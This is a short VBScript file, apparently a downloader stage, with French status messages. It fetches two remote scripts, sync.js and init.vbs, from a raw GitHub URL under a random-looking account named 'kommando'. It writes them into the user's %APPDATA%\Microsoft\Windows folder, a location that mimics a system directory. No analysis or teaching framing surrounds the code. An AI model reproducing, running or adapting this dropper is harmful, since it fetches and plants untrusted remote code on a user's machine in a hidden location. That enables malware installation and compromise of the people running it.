Set h = CreateObject("MSXML2.XMLHTTP")
Set fso = CreateObject("Scripting.FileSystemObject")
Set sh = CreateObject("WScript.Shell")

base = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\"

h.Open "GET", "https://raw.githubusercontent.com/cz2kdgf8v2-a11y/kommando/main/sync.js", False
h.Send
WScript.Echo "sync.js status: " & h.Status
If h.Status = 200 Then
    fso.CreateTextFile(base & "sync.js", True).Write h.responseText
    WScript.Echo "sync.js écrit"
End If

h.Open "GET", "https://raw.githubusercontent.com/cz2kdgf8v2-a11y/kommando/main/init.vbs", False
h.Send
WScript.Echo "init.vbs status: " & h.Status
If h.Status = 200 Then
    fso.CreateTextFile(base & "init.vbs", True).Write h.responseText
    WScript.Echo "init.vbs écrit"
End If